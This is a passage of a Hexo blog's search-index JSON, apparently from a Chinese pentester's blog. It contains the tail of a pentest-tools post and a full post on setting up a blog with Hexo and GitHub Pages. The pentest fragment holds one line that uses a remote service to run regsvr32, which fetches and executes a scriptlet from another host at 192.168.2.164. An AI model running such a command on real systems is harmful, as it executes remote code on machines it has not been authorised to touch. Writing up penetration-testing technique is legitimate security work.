class=\"line\">service_exec(conn, <span class=\"string\">r&#x27;cmd /c regsvr32 /s /n /u /i:http://192.168.2.164:8080/test.sct scrobj.dll&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>以上便是几个使用频率比较高的工具，还有诸如CS上面的插件，k8的扫描工具等，效果一般或者比较傻瓜化，故不再记录。</p>\n","categories":["Pentest"],"tags":["工具"]},{"title":"helloworld again","url":"http://blog.le31ei.top/2020/08/17/helloworld-again/","content":"<p>重新整理了下博客内容，删除了以前的文章，换了个简洁的主题。学习还是要养成输出的习惯，学完一块内容后，做个总结，回头看看自己过程也是很好的事情。</p>\n<p>本文记录一下github pages搭建的过程。</p>\n<h1 id=\"0x01-hexo安装\"><a href=\"#0x01-hexo安装\" class=\"headerlink\" title=\"0x01 hexo安装\"></a>0x01 hexo安装</h1><p>npm等环境安装不再详述。</p>\n<p>直接上命令：<code>npm install -g hexo</code></p>\n<p>初始化命令：<code>hexo init</code>，生成基本的结构</p>\n<p><img src=\"/2020/08/17/helloworld-again/image-20200817154147163.png\" alt=\"image-20200817154147163\"></p>\n<h1 id=\"0x02-github创建项目\"><a href=\"#0x02-github创建项目\" class=\"headerlink\" title=\"0x02 github创建项目\"></a>0x02 github创建项目</h1><p>创建<code>username.github.io</code>名称的项目即可，对应的github pages就是这个</p>\n<p>blog目录下设置git全局参数:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-主题及配置\"><a href=\"#0x03-主题及配置\" class=\"headerlink\" title=\"0x03 主题及配置\"></a>0x03 主题及配置</h1><p>修改<code>_config.yml</code>文件deploy，设置如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repo:</span> </span><br><span class=\"line\">    <span class=\"attr\">github:</span> <span class=\"string\">https://github.com/le31ei/le31ei.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n\n<p>选择的主题是<code>https://github.com/forsigner/fexo</code>，够简洁的主题</p>\n<p>替换的方法比较简单，参考文档<code>http://forsigner.com/2016/03/10/fexo-doc-zh-cn/</code></p>\n<p>这里记录下常用的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 升级</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> themes/fexo</span><br><span class=\"line\">$ git commit -am <span class=\"string\">&#x27;update&#x27;</span></span><br><span class=\"line\">$ git pull</span><br><span class=\"line\"><span class=\"comment\"># 启用</span></span><br><span class=\"line\"><span class=\"comment\"># 打开博客根目录的 _config.yml 设为 theme: fexo</span></span><br></pre></td></tr></table></figure>\n\n<p>主题的配置路径<code>themes/fexo/_config.yml</code>，具体配置参数可以参考文档自己做细微的调整。</p>\n<p>其他hexo常见命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建测试页面</span></span><br><span class=\"line\">hexo n <span class=\"string\">&quot;test&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 部署</span></span><br><span class=\"line\">hexo g -d</span><br><span class=\"line\"><span class=\"comment\"># 新建草稿</span></span><br><span class=\"line\">hexo new draft <span class=\"string\">&quot;new draft&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 草稿变成文章</span></span><br><span class=\"line\">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"0x04-绑定自定义域名\"><a href=\"#0x04-绑定自定义域名\" class=\"headerlink\" title=\"0x04 绑定自定义域名\"></a>0x04 绑定自定义域名</h1><p>需要添加CNAME，将自己的域名填写到CNAME文件中，DNS解析选择CNAME解析。</p>\n<p><img src=\"/2020/08/17/helloworld-again/image-20200817155628007.png\" alt=\"image-20200817155628007\"></p>\n<p>以上就是博客搭建过程。搭建过程中也尝试了给博客提提速，github国内访问实在太慢，而且百度爬虫也会403。奈何尝试过CDN（需要备案放弃）、coding.net的pages、gitee pages，各种复杂配置，还是回到了最简单的方式，直接github访问省时省力。</p>\n","categories":["杂文"],"tags":["hexo"]},{"title":"about","url":"http://blog.le31ei.top/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://blog.le31ei.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://blog.le31ei.top/tag/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://blog.le31ei.top/search/index.html","content":"","categories":[],"tags":[]}]